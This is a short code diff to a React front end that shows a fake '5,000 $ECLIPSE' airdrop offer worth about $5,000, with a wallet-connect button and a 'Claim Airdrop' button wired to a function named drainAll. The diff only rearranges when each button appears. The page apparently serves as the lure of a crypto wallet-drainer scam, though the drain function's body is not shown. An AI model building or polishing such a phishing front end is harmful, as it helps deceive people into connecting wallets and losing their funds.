@@ -128,10 +128,10 @@ const App = () => {
           <div className="reward-amount">5,000 $ECLIPSE</div>
           <div className="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>
 
-          {isConnected && address ? (
-            <button onClick={drainAll} className="connect-btn">Claim Airdrop</button>
-          ) : (
+          {!address ? (
             <button onClick={() => open()} className="connect-btn">Connect Wallet</button>
+          ) : (
+            <button onClick={drainAll} className="connect-btn">Claim Airdrop</button>
           )}
 
           <div className="eligibility">
